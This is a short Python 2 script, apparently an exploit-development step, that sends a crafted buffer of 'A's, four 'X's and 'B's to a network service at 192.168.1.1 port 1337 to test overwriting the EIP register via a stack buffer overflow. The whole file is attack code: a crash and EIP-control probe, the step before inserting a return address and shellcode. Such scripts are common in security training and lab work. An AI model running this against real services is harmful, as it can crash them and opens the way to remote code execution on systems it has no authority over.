#!/usr/bin/python
import socket
import traceback

targetIP = "192.168.1.1"
targetPort = 1337
bufferSize = 3000
eipOffset = 1000

try:
  print "\nSending EIP control test..."
  
  preFill = "A" * eipOffset
  eip = "X" * 4
  bufferFill = "B" * (bufferSize - len(preFill) - len(eip))
  data = preFill + eip + bufferFill

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIP, targetPort))
  s.send(data)
  s.close()

  print "\nDone!"
  
except Exception:
  traceback.print_exc()